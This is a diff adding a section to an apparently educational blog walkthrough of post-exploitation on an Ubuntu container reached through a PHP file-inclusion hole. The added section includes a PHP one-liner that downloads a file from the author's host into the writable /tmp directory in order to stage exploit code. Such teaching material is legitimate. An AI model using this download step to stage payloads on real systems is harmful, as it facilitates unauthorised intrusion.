@@ -92,7 +92,32 @@ $ dpkg -S /usr/bin/sftp
 openssh-client: /usr/bin/sftp
 ~~~
 
-If you run a default Ubuntu container though, openssh-client isn't included, it was installed as part of git. 
+If you run a default Ubuntu container though, openssh-client isn't included, it was installed as part of git.  Check for yourself in a default Ubuntu container, lots of the stuff we'd typically rely on getting files into and out of a server we're in aren't there. No ftp, no tftp, no wget, curl, fetch, etc etc. This complicates getting our exploit code on to the server. Further, it complicates compiling it once it's there.  
 
----to be continued...---
+In the spirit of living off the land, let's start with what got us here to begin with, php. We have rights to the system, we can move around in a shell, let's see if we can excute php. This isn't pretty, but it proves my point, we can execute arbitrary php commands.
+
+![PHP Works]({{site.url}}/images/phpworks.png){: .center-image } 
+ 
+Let's find somewhere we can write to, then we'll use our php file inclusion vulnerability to bring a file in of our choosing. We need somewhere we can write to, and /tmp is often available. The same is the case here:
+
+~~~
+$ ls -asl /tmp
+total 8
+4 drwxrwxrwt  2 root root 4096 Jan 12 03:21 .
+4 drwxr-xr-x 54 root root 4096 Jan 12 03:21 ..
+~~~
+
+To download a file with php, we can use this simple oneliner. 
+
+~~~
+php -r 'file_put_contents("test", file_get_contents("http://192.168.1.20/test"));'
+~~~
+
+I created a file called test on my web server and echo'ed hello into it so it had something we can see work, and voila! It transfers.
+
+![PHP Download]({{site.url}}/images/phpdownload.png){: .center-image }
+
+So now that we can move files to and from our server, we need to figure out how to get our exploit there. We don't have gcc available, which makes this difficult. 
+
+----to be continued....---
 
